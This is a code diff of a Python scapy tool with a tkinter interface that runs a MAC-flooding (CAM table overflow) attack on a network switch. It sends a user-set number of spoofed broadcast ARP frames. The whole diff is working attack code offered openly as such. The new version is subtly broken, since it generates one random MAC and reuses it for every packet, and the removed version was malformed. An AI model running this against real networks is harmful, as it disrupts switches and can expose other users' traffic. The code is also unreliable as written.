@@ -1,17 +1,16 @@
 import threading
-import traceback
-
 from scapy.all import *
 from scapy.layers.l2 import Ether, ARP, sendp
+from random import randint
 
 from tkinter import *
 
-def startCam(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, targetMac, colorConfig = "#252525") :
+def startCam(targetIp, packetNumber, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
 
     global camIsRunning, camThreads, terminalLabel, wiresharkLabel, errorOutputLabel
 
     camIsRunning = False
-    camThreads = threading.Thread(target = lambda : generate_packets(targetIp, targetMac))
+    camThreads = threading.Thread(target = lambda : camAttackHub(targetIp, packetNumber))
 
     terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
@@ -21,44 +20,41 @@ def startCam(terminalContentFrame, wiresharkContentFrame, errorOutputContentFram
     errorOutputLabel.configure(bg = colorConfig)
 
     terminalLabel["text"] += "$ Target IP = " + targetIp + "\n"
-    terminalLabel["text"] += "$ Target MAC = " + targetMac + "\n"
+    terminalLabel["text"] += "$ Amount of Packets to send = " + packetNumber + "\n"
     terminalLabel["text"] += "$ Running CAM Overflow Attack...\n"
 
-    print("\nTarget IP = " + targetIp + " and Target MAC = " + targetMac + "\n")
+    print("\nTarget IP = " + targetIp + "\n")
 
-    runCamAttack(targetIp, targetMac)
+    runCamAttack()
     
     terminalLabel.pack(anchor = NW)
     errorOutputLabel.pack(anchor = NW)
 
-def stopCam() :
-    global camThreads, camIsRunning
-    try:
-        terminalLabel["text"] += "$ Stopping CAM Table Attack...\n"
-        camIsrunning = False
-        camThreads.join(0)
-        camThreads = None
-        terminalLabel["text"] += "$ CAM Table Attack successfully stopped!\n"
-    except (AttributeError, RuntimeError):
-        errorOutputLabel["text"] += traceback.format_exc()
-    except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"
-
-def runCamAttack(targetIp, targetMac) :
+def runCamAttack() :
     global camThreads, camIsRunning
     camIsRunning = True
     camThreads.start()
 
-def generate_packets(targetIp, targetMac) :
-    packet_list = []
-    fake_macs = ["00:AA:BB:CC:DD:{:02x}".format(i) for i in range(1, 256)]
-    
-    for mac in fake_macs :
-        packet = Ether(source=mac, destination=targetMac/ ARP(op=2, pdst=targetIp))
-        packet_list.append(packet)
-    
-    cam_overflow(packet_list)
+def camAttackHub(targetIp, packetNumber) :
+    randomMac = get_random_mac()
+    packet = create_packet(targetIp, randomMac)
+    send_packet(packet, packetNumber)
 
-def cam_overflow(packet_list) :
-    sendp(packet_list, iface="eth0")
-    stopCam()
+# create a random MAC address function
+def get_random_mac():
+    return ":".join(["%02x" % randint(0, 255) for _ in range(6)])
+
+# Create a packet with a fake MAC address
+def create_packet(target_ip, randomMac):
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=randomMac) / ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
+    return packet
+
+# Send the packet multiple times to flood the switch's CAM table
+def send_packet(packet, packetNumber):
+    try :
+        sendp(packet, inter=0.2, count=int(packetNumber))
+    except Exception as e:
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+
+    terminalLabel["text"] += "\n All packets sent! \n"
+    terminalLabel["text"] += "CAM Table Attack Completed \n\n"
